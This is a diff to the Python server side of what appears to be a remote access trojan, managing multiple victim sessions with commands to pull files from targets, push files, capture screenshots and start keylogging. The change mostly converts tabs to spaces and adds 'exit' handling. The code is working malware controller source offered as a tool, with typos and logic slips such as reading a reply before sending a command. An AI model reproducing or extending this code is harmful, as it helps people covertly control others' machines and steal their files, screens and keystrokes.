@@ -9,58 +9,63 @@ import threading
 
 
 def shell(target, ip):
-	def relibale_send(data):
-		json_data = json.dumps(data)
-		target.send(bytes(json_data, 'utf-8'))
-	def reliable_recv():
-		data = ""
-		while True:
-			try:
-				data = data + str(target.recv(1024).decode("utf-8"))
-				return json.loads(data)
-			except ValueError:
-				continue
+    def relibale_send(data):
+        json_data = json.dumps(data)
+        target.send(bytes(json_data, 'utf-8'))
+    def reliable_recv():
+        data = ""
+        while True:
+            try:
+                data = data + str(target.recv(1024).decode("utf-8"))
+                return json.loads(data)
+            except ValueError:
+                continue
 
 
                
-	global count
-	while True:
-		command = reliable_recv()
-		command = input("* Shell#-%s: " % str(ip))
-		print("Commansd came %s " % str(command))
-		relibale_send(command)
-		print("Command came %s " % str(command)) 
-		if command =='q':
-			continue
-		elif command[:2] == "cd" and len(command) >1:
-			continue
-		elif command[:8] == "download":
-			with open(command[9:], "wb") as file:
-				file_data = reliable_recv()
-				file.write(base64.b64decode(file_data))
-		elif command[:8] == "upload":
-			try:
-				with open(command[7:], "rb") as fin:
-					relibale_send(base64.b64encode(fin.read()))
-			except:
-				failed = "failed to upload "
-				relibale_send(base64.b64encode(failed))
-		elif command[:10] == "screenshot":
-			with open("screenhot%d" %count, "wb") as screen:
-				image = reliable_recv()
-				image_decoded = base64.b64decode(image)
-				if image_decoded[:4] == ["[!!]"]:
-					print(image_decoded)
-				else:
-					screen.write(image_decoded)
-					count += 1
-		elif command[:12] == "keylog_start":
-			continue
+    global count
+    while True:
+        command = reliable_recv()
+        command = input("* Shell#-%s: " % str(ip))
+        print("Commansd came %s " % str(command))
+        relibale_send(command)
+        print("Command came %s " % str(command)) 
+        if command =='q':
+            continue
+        if command == "exit":
+            target.close()
+            targets.remove(target)
+            ips.remove(ip)
+            break
+        elif command[:2] == "cd" and len(command) >1:
+            continue
+        elif command[:8] == "download":
+            with open(command[9:], "wb") as file:
+                file_data = reliable_recv()
+                file.write(base64.b64decode(file_data))
+        elif command[:8] == "upload":
+            try:
+                with open(command[7:], "rb") as fin:
+                    relibale_send(base64.b64encode(fin.read()))
+            except:
+                failed = "failed to upload "
+                relibale_send(base64.b64encode(failed))
+        elif command[:10] == "screenshot":
+            with open("screenhot%d" %count, "wb") as screen:
+                image = reliable_recv()
+                image_decoded = base64.b64decode(image)
+                if image_decoded[:4] == ["[!!]"]:
+                    print(image_decoded)
+                else:
+                    screen.write(image_decoded)
+                    count += 1
+        elif command[:12] == "keylog_start":
+            continue
 
-			
-		else:
-			result = reliable_recv()
-			print(result)
+            
+        else:
+            result = reliable_recv()
+            print(result)
 
 
 
@@ -99,6 +104,13 @@ while True:
         for ip in ips:
             print("session  " + str(count) + " <-->." + str(ip))
             count += 1
+    elif command == "exit":
+        for target in targets:
+            target.close()
+        s.close()
+        stop_threads = True
+        t1.join()
+        break
     elif command[:7] == "session":
         try:
             num = int(command[8:])
@@ -107,3 +119,5 @@ while True:
             shell(tarnum, tarip)
         except:
             print("[!!] No session Under The Number.")
+
+        
